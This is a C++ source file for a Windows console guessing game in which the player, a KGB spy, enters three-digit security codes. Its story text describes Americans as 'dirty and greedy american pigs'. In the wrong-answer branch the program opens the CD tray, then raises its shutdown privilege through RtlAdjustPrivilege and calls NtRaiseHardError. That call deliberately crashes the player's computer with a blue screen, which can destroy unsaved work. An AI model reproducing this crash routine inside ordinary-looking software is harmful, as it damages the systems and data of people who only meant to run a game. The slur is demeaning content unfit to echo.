// RedLeakConsole.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <stdio.h>
#include <Windows.h>
using namespace std;

#pragma comment(lib,"ntdll.lib")

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOption, PULONG Response);

HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);



void PrintIntroduction()
{
	cout << "************************************************\n";
	cout << "*______            _  _                   _    *\n";
	cout << "*| ___ \\          | || |                 | |   *\n";
	cout << "*| |_/ /  ___   __| || |      ___   __ _ | | __*\n";
	cout << "*|    /  / _ \\ / _` || |     / _ \\ / _` || |/ /*\n";
	cout << "*| |\\ \\ |  __/| (_| || |____|  __/| (_| ||   < *\n";
	cout << "*\\_| \\_| \\___| \\__,_|\\_____/ \\___| \\__,_||_|\\_\\*\n";
	cout << "************************************************\n";


	cout << "The year is 1965, two great powers are figthing for supremacy of the dome.\n";
	cout << "On one side we have the proud and glorious motherland, also know as the URSS.\n";
	cout << "On the other side we have the illiterate, dirty and greedy american pigs.\n";
	cout << "Who wins this war will be the most powerfull and influential country in the world.\n";
	cout << "You are agent 13, a KGB spy secretly infiltrated in the CIA HQ.\n";
	cout << "You need to find the correct security codes to bypass the security systems and steal the secret CIA projects to send them to our motherland.\n";
	PlaySound(L"MainMusic.wav", NULL, SND_ASYNC | SND_LOOP);

}

void PrintKGBIntro(int Difficulty)
{
	cout << "Infiltration Progress ( "<< Difficulty <<  " /13).\n";
	

}

bool PlayGame(int Difficulty)
{

	PrintKGBIntro(Difficulty);

	//declare the 3 number code
	const int CodeA = 4;
	const int CodeB = 3;
	const int CodeC = 2;

	//print CodeSum and CodeProduct to the terminal
	const int CodeSum = CodeA + CodeB + CodeC;
	const int CodeProduct = CodeA * CodeB * CodeC;

	//hints
	cout;
	cout << "There are 3 numbers in the security code.\n";
	cout << "\nThe codes add-up to: " << CodeSum;
	cout << "\nThe codes multiply to give: " << CodeProduct << endl;
	cout << "To enter de code you must write each number with a space between them, like this: X X X.\n\n";

	SetConsoleTextAttribute(hConsole, 12);
	cout << "MAKING A MISTAKE WILL HAVE DIRE CONSEQUENCES!!!!\n";
	SetConsoleTextAttribute(hConsole, 15);
	cout << "\nEnter the correct code to continue:\n\n";

	int GuessA, GuessB, GuessC;
	cin >> GuessA >> GuessB >> GuessC;


	int GuessSum = GuessA + GuessB + GuessC;
	int GuessProduct = GuessA * GuessB * GuessC;

	
	//Check if player guess is correct
	if (Difficulty>=13)
	{
		cout << "\nGood my comrade, you did a great job for the motherland!\n";
		SetConsoleTextAttribute(hConsole, 12);
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,,,,,*%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,,,,*%%%%%%%%%%,,,,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,,,,,,,,,,,,,%%%%%%%%,,,,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#,,,,,,,,,,,,/%%%%%%%%%%%%,,,,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,,,,,,,,,,,,,%%%%%%%%%%%%%%%%%,,,,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,,,,,,,,,,,,,,,,,%%%%%%%%%%%%%%%%,,,,,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,,,,,,,%,,,,,,,,,%%%%%%%%%%%%%%,,,,,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,,%%%%%%%,,,,,,,,#%%%%%%%%%%%%,,,,,,(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,,,,,,,,,%%%%%%%%%%,,,,,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#,,,,,,,,*%%%%%%%,,,,,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,,,,,,,,,%%%%,,,,,,,#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#*%%%%%%%%%%%*,,,,,,,,,,,,,,,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,,,,,,,,,,%%%%%%%%%%%,,,,,,,,,,,,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,,,,,,,,,,,,,,,*%%%%%%,,,,,,,,,,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,,,,,,,,%%%,,,,,,,,,,,,,,,,,,,,,,,,,,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,,,,,,,,%%%%%%%%%(,,,,,,,,,,,,,,,,,,,,,,,,,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,,,,,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#,,,,,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%,,,%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" << endl;
		cout << "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\n" << endl;
		SetConsoleTextAttribute(hConsole, 15);

		

	    PlaySound(NULL, NULL, SND_ASYNC);
		PlaySound(L"Motherland.wav", NULL, SND_SYNC);

		return true;
		

	}

	else if (GuessSum == CodeSum && GuessProduct == CodeProduct)
	{
		cout << "Good work comrade, keep going. \n";
		return true;
	}
	else
	{
		SetConsoleTextAttribute(hConsole,12);
		for (int k = 1; k < 100; k++)
		{
			cout << "\nCyka blyat comrade, you entered the wrong code and doomed us all!!!!";
		}
		
		mciSendString(L"set cdaudio door open", NULL, NULL, NULL);
		//Sleep(5000);
		//SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
		////turn back on
		//SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)-1);
		//Sleep(3000);

		//BSOD
		BOOLEAN bl;
		unsigned long response;
		RtlAdjustPrivilege(19, true, false, &bl);
		NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
		return false;
	}
}


int main()
{
	int LevelDifficulty = 1;

	PrintIntroduction();

	
	while (true)
	{
	
		bool bLevelComplete = PlayGame(LevelDifficulty);
		cin.clear();
		cin.ignore();

		if (bLevelComplete)
		{
			++LevelDifficulty;
		}
	}
	return 0;
}


